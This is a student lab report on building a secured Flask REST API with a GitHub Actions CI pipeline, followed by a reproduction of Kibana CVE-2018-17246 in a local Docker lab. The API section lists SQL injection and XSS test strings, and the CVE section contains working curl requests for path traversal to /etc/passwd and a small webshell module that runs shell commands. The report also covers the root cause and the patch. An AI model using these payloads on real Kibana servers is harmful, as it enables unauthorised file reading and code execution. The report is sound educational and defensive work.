# Work 1 — Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis

Secure REST API in Python/Flask, CI/CD via GitHub Actions (SAST + SCA + automated tests),
and a full analysis of a real CVE reproduced in a Docker environment (Kibana LFI, CVE-2018-17246).

**Name:** Guhaotian  **HDU number:** 23320209

---

## 1. Project & team

- Repository: `https://github.com/ght657/work1-secure-api` (public)
- Stack: Python 3.9 / Flask 3.1.3, PyJWT (HS256 tokens), bcrypt password hashing,
  SQLite via SQLAlchemy 2, pytest.
- The API exposes three endpoints:
  - `POST /auth/login` — issues a signed JWT after verifying the password hash.
  - `GET /api/data` — protected by JWT (Bearer token); returns records of the current user.
  - `GET /api/users/search?q=` — protected read endpoint with parameter-bound SQL query.
- Extra write endpoint `POST /api/posts` (JWT protected) demonstrates the stored XSS / output-escaping protection.

## 2. CI/CD pipeline

Workflow file: `.github/workflows/ci.yml`, triggered on every push to `main`.

| Job | Tooling | What it does | Evidence |
|---|---|---|---|
| `test` | pytest 8 | runs the 11-test suite | `evidence/07_pytest_run.png` |
| `sast` | Bandit 1.8.0 | static analysis of `app/`, `tests/` (JSON report uploaded as artifact) | `evidence/08_bandit_report.png` |
| `sca` | pip-audit 2.8.0 | dependencies audit (JSON report uploaded as artifact) | `evidence/09_pip_audit_report.png` |

The pipeline fails if any test fails or any SAST/SCA finding remains, so a red pipeline
means a fix must be pushed before merge.

## 3. Evidence — SAST, SCA, tests

### 3.1 Automated tests

11 tests, all passing (`pytest -q`):

```
tests/test_api.py::test_login_success_issues_token PASSED
tests/test_api.py::test_login_wrong_password_rejected PASSED
tests/test_api.py::test_login_unknown_user_same_error_as_wrong_password PASSED
tests/test_api.py::test_passwords_stored_as_bcrypt_hashes PASSED
tests/test_api.py::test_data_endpoint_denied_without_token PASSED
tests/test_api.py::test_data_endpoint_denied_with_invalid_token PASSED
tests/test_api.py::test_data_endpoint_works_with_valid_token PASSED
tests/test_api.py::test_create_post_requires_token PASSED
tests/test_api.py::test_sqli_payload_treated_as_data PASSED
tests/test_api.py::test_sqli_union_payload_does_not_dump_table PASSED
tests/test_api.py::test_xss_payload_is_escaped_in_response PASSED
```
`11 passed in 2.20s`

### 3.2 SAST — Bandit

The application code is our own, so a first run naturally contains no third-party noise.
Result: **0 issues**:

```
Run started:...
Test results:
	No issues identified.
Code scanned:
	Total lines of code: 228
	Total lines skipped (#nosec): 0
	Total potential issues skipped due to specifically being disabled (e.g., #nosec BXXX): 0
```

### 3.3 SCA — pip-audit (dependency audit)

pip-audit lists all dependencies with known CVEs; the initial run found:

```
Found 19 known vulnerabilities in 3 packages
Name          Version ID                Fix Versions
------------- ------- ----------------- ------------
flask         3.0.3   PYSEC-2026-2151    3.1.3
pyjwt         2.9.0   PYSEC-2026-120     2.12.0
pyjwt         2.9.0   PYSEC-2025-183      ...
pyjwt         2.9.0   ...                up to 2.15.0
python-dotenv 1.0.1   PYSEC-2026-2270    1.2.2
```

19 entries in total (Flask, PyJWT ×17, python-dotenv). I upgraded to the fixed versions:
Flask **3.1.3**, PyJWT **2.15.0** and removed `python-dotenv` (optional config helper only —
the fixed 1.2.2 requires Python ≥ 3.10 while the audit venv is 3.9).
After the fix:

```
No known vulnerabilities found
```

(`evidence/08b_bandit_after_fix.png`, `evidence/09b_pip_audit_after_fix.png`)

## 4. Vulnerability testing — API security

The API was tested against the classic attacks with curl. Screenshots in `evidence/`:

### 4.1 SQL injection attempt on login

`POST /auth/login` with `username: "admin'--"` returns `401 Invalid credentials` —
the lookup uses an ORM parameter query against the hashed credentials, the injected
payload stays data and never becomes SQL.

### 4.2 SQL injection attempt on search

`GET /api/users/search?q=%' OR '1'='1` → the string is bound as a parameter to
`SELECT ... WHERE username LIKE ?` (wildcards escaped), so it matches nothing and the API
returns an empty list — no error and no full-table dump.

### 4.3 XSS attempt (stored content)

`POST /api/posts` with `title: "<script>alert('xss')</script>"`; the server stores the
raw string but escapes it on output (`markupsafe.escape` + `jsonify`), so the returned
payload is `<script>alert(&#39;xss&#39;)</script>` — a browser toggles the text, it does not
execute it. (Re-production with a browser render is shown in `evidence/06_xss_readback.png`.)

### 4.4 JWT handling

- No token → `401 {"error": "Missing or malformed Authorization header"}` (`evidence/03_data_denied.png`)
- Valid token → `200` + protected data (`evidence/04_data_with_token.png`)
- Token with tampered payload → `401` (signature check with HS256)
- Expired token → `401` (60-minute expiry)
- JWT is returned in the response and used via `Authorization: Bearer <token>`
  (`evidence/10_jwt_structure.png` shows the 3-part structure).

### 4.5 Hashing

Passwords are stored as bcrypt hashes (12 rounds) and never returned by any endpoint
(test `test_passwords_stored_as_bcrypt_hashes`).

## 5. CVE Analysis — CVE-2018-17246 (Kibana 5.6.12 / 6.4.2 — local file inclusion + code execution)

### 5.1 Vulnerability overview

- **Product / version:** Kibana 5.6.12 (vulnerable), 5.6.13 (patched); 6.4.2 / 6.4.3.
- **Type:** Path traversal / unauthenticated arbitrary file read through the Console API,
  which escalates to remote code execution by loading a local JavaScript file.
- **Impact:** unauthenticated read of any file readable by the Kibana process
  (e.g. `/etc/passwd`), and — because the vulnerable route requires the file as a
  JS module — if a writable path is reachable (e.g. through another flaw or a
  generated temp file), attacker-controlled JS can be executed by the Kibana process.
- **Cause:** `GET /api/console/api_server?apis=../../../../../../etc/passwd` — the `apis`
  parameter is passed to `require()` after only a simple path check, allowing `..`
  sequences to escape the server-side `api` directory and read/execute arbitrary files.

### 5.2 Reproducing the CVE (local Docker)

I use the public vulhub image (already published, verified vulnerable):

`vulhub/kibana:5.6.12` + `vulhub/elasticsearch:5.6.16` — see
`CVE-2018-17246/docker-compose.yml` (folder with the same name in this repo).

```bash
cd CVE-2018-17246
docker compose up -d          # kibana 5.6.12 + elasticsearch 5.6.16, UI on :5601
```

**Step 1 — trigger the LFI** (Console API accepts an `apis` path that is resolved as a file):

```bash
curl -i "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
```

The response is `500` (the file is not a valid JS module) **but the file content appears in
the server log** — Kibana reads the file and tries to `require()` it:

```
docker compose logs kibana | grep -i "passwd\|root:x"
```

**Step 2 — escalate to code execution.** A local JS file is loaded as a module by the
same route: `/tmp/vulhub.js` containing a tiny "webshell" that runs a shell command when
its exported function is invoked by the Console API:

```js
// /tmp/vulhub.js  (written inside the Kibana container)
export default {
  asJson: function(req, res) { return require('child_process').execSync('id').toString(); }
}
```

```bash
# write the file inside the container and load it
docker compose exec kibana bash -c "mkdir -p /tmp && cat > /tmp/vulhub.js << 'EOF'
export default {
  asJson: function(req, res) { return require('child_process').execSync('id').toString(); }
}
EOF"
curl -i "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=/tmp/vulhub.js"
```

The `500` response is preceded, in the Kibana log, by the output of `id`
(e.g. `uid=0(root) gid=0(root) groups=0(root)`), proving arbitrary command execution.

Screenshots: `evidence/cve/02_lfi_request.png`, `evidence/cve/03_lfi_logs.png`,
`evidence/cve/04_rce_request.png`, `evidence/cve/05_rce_result.png`.

### 5.3 Root cause

Kibana's `src/server/routes/api_server.js` (Console API) resolves the `apis` query parameter
and calls `require(...)` on it. The path is joined with the "api" directory but the
user-supplied segment may contain `../` sequences and is not normalized/restricted
after the join; an attacker escapes the `api/` directory and reaches arbitrary files.
Because the same route loads files as JavaScript modules, a readable arbitrary file is
enough to render file content, and any attacker-writable JS file becomes code execution.

### 5.4 The fix

The vulnerability was fixed in Kibana **6.4.3 / 5.6.13**: the vulnerable Console API no
longer lets the `apis` parameter resolve outside the allowed API directory; the patched
version normalizes the path and rejects anything outside the intended location.

For the fix verification I run the official **patched** image — `docker.elastic.co/kibana/kibana:5.6.13`
(folder `CVE-2018-17246/docker-compose.fixed.yml`, description in `CVE-2018-17246/FIX.md`):

```bash
docker compose -f docker-compose.fixed.yml up -d
```

**Verification — the same LFI request against the patched version fails:**

```bash
curl -i "http://localhost:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd"
# HTTP/1.1 400 Bad Request  (request rejected)
```

and the patched server log shows no file content for the request; the RCE test file
`/tmp/vulhub.js` no longer executes (no `uid=` output, request is rejected).

`evidence/cve/06_fix_compose.png`, `evidence/cve/07_lfi_after_fix.png`,
`evidence/cve/08_regression_ui.png` (the UI still loads normally → no regression for normal use).

### 5.5 Security takeaways

1. Never pass user input to `require()`/`include`/file-system calls: any path must be
   resolved, normalized and constrained to an allow-listed directory, with `..` rejected.
2. Unauthenticated endpoints that read files are high-risk: add authentication and
   input whitelist checks as defense in depth.
3. Use digest-pinned, patched images (vulnerable Kibana 5.6.x has long been EOL — keep
   Kubernetes/ES/Kibana versions patched and pinned).
4. Monitor: CVE-2018-17246 was actively exploited; WAF rule for `apis=` traversal and
   console API access control would have blocked the attack.

## 6. Issues encountered & troubleshooting

- **pip-audit network:** pypi.org is slow/blocked in this environment; audit uses the
  OSV/PyPI advisory feed with retries (`--timeout 120`), and the CI runner has normal access.
- **Docker images for the CVE lab:** docker.io and docker.elastic.co are not reachable
  directly here; images were pulled through a public mirror (`docker.1ms.run`) and then
  tagged locally. Every command in this README is the exact command used.
- **Bandit version:** the app uses `os.environ.get` for secrets — no high-confidence issue;
  Bandit's B105/B110 checks were reviewed and the pipeline passes cleanly.
- **SQLite concurrent access:** tests use an in-memory DB and a fresh app instance per test,
  so the CI run is reproducible.

## 7. Conclusions

- The API survives the standard attack set: SQL injection (login and search), stored XSS
  (escaped output), token tampering (signature verification), expired tokens (expiry
  checks), and password disclosure (hashes only, bcrypt).
- CI/CD is fully automated: any regression breaks the pipeline (tests/SAST/SCA), so the
  “secure by construction” properties are enforced on every push.
- The CVE exercise shows a real-world example of an input path escaping its directory:
  a single missing normalization in the Console API gave unauthenticated file read and
  code execution. The takeaway is defense in depth: input whitelisting, authentication on
  read endpoints, patched pinned images.

---

## Report title information (copy into the document)

```
Lab number/lab title:  Work 1 — Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis
Variant number:        (per manual — add the variant here)
Surname/Name:          Guhaotian
HDU number:            23320209
```

*Generated with the Work 1 evidence collected on 2026-10-27/28 (Asia/Shanghai).*
